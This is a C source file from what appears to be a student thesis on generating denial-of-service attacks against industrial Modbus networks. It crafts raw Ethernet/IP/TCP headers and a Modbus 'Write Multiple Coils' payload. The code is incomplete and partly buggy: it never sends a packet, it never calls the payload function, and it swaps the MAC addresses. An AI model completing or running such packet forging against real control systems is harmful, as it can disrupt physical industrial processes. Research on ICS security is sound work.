// Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
// File:        dos.c
// Author:      Jakub Kuzník, FIT
//  

// Execution:

#include "dos.h"


int main(void){
  
  // Modbus TCP packet 
  modbusPacket mPacket;
  
  srand(time(NULL));   // rand nums init.
  buildModbusPacket(&mPacket);

  // todo maybe modifyTcpParams()

  int raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (raw_socket < 0) {
    exit(1);
  }

  // todo free modbusPayload->data
  return 0;



}

/**
 * @brief Function create modbus packet.
 * it uses constants from dos.h to fill eth/ip/tcp headers.
 */
void buildModbusPacket(modbusPacket * mPacket){

  // create eth/ip/tcp headers and store inside mPacket struct. 
  createEthHeader(&mPacket->ethHeader);
  createIpHeader(&mPacket->ipHeader);
  createTcpHeader(&mPacket->tcpHeader);

  // TODO maybe we need to calculate ip checksum 
  
  // create Modbus part of packet 
  // good to realize that modbusH->lenght tell us lenght in bytes
  //   from unitId to end of data 
  createModbusHeader(&mPacket->modbusH);
   

  printf("hi") ;
}

/**
 * @brief Create a Modbus Payload. 
 */
void creteModbusPayload(modbusPayload * mPayload){
  mPayload->functionCode = 15; // Write Multiple Coils
  mPayload->data = malloc(6);

  // reference number 0 
  mPayload->data[0] = 0;
  mPayload->data[1] = 0;
  // bit count 4
  mPayload->data[2] = 0;
  mPayload->data[3] = 4; 
  // byte count 1
  mPayload->data[4] = 1;
  // data 0
  mPayload->data[5] = 0; 

}

/**
 * @brief Create a Modbus Header.
 */
void createModbusHeader(modbusHeader * mHeader){
  mHeader->transactionId = rand();
  mHeader->protocolId = htons(0);
  mHeader->lenght = htons(8);
  mHeader->unitId = 1;
}

/**
 * @brief It builds tcp header using constants from dos.h 
 */
void createTcpHeader(struct tcphdr * tcpHeader){
  tcpHeader->source = htons(TCP_SRC_PORT);
  tcpHeader->dest = htons(TCP_DST_PORT);
  tcpHeader->seq = htonl((uint32_t)rand());
  tcpHeader->ack_seq = htonl((uint32_t)rand());
  tcpHeader->doff = 5;
  tcpHeader->syn = 1;
  tcpHeader->window = htons(1024);
  tcpHeader->check = 0;
  tcpHeader->urg_ptr = 0;
}

/**
 * @brief it builds ipv4 header using constants from dos.h 
 */
void createIpHeader(struct iphdr * ipHeader){
  ipHeader->ihl = 5;
  ipHeader->version = 4;
  ipHeader->tos = 0;
  // for different packets there should be change 
  ipHeader->tot_len = IP_HEADER_TOTAL_LENGHT;
  ipHeader->id = htons(12345);
  ipHeader->frag_off = 0;
  ipHeader->ttl = 64;
  ipHeader->protocol = IPPROTO_TCP;
  ipHeader->check = 0;
  ipHeader->saddr = inet_addr(IP_SRC);
  ipHeader->daddr = inet_addr(IP_DST);
}

/**
 * @brief it builds ethernet header using. constants from dos.h 
 */
void createEthHeader(struct ether_header * ethHeader){

  unsigned char srcMac[6], dstMac[6]; 
    
  convertMac(srcMac, MAC_SRC);
  convertMac(dstMac, MAC_DST);
  
  // copy MAC to header byte by byte 
  for (int i = 0; i < 6; i++){
    ethHeader->ether_dhost[i] = srcMac[i]; 
    ethHeader->ether_shost[i] = dstMac[i];

  }
  ethHeader->ether_type = htons(ETHERTYPE_IP); 

}

/**
 * @brief it converts mac address from const char "aa:aa:bb:bb:cc:cc"
 *  to unsigned char out[6] 
 */
void convertMac(unsigned char out[6], const char * macStr){
  if (sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &out[0], &out[1], &out[2],
             &out[3], &out[4], &out[5]) != 6) {
    fprintf(stderr, "Can't convert MAC addres\n");
  } 
}
